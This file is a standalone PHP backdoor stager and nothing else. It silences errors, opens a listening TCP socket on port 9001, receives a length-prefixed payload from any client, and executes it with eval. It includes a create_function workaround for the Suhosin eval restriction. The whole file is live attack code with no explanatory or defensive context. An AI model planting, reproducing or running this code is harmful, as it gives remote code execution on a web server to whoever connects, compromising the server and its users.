/*<?php /**/ error_reporting(0); $ip = '0.0.0.0'; $port = 9001; if (is_callable('stream_socket_server')) { $srvsock = stream_socket_server("tcp://{$ip}:{$port}"); if (!$srvsock) { die(); } $s = stream_socket_accept($srvsock, -1); fclose($srvsock); $s_type = 'stream'; } elseif (is_callable('socket_create_listen')) { $srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP); if (!$res) { die(); } $s = socket_accept($srvsock); socket_close($srvsock); $s_type = 'socket'; } elseif (is_callable('socket_create')) { $srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); $res = socket_bind($srvsock, $ip, $port); if (!$res) { die(); } $s = socket_accept($srvsock); socket_close($srvsock); $s_type = 'socket'; } else { die(); } if (!$s) { die(); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();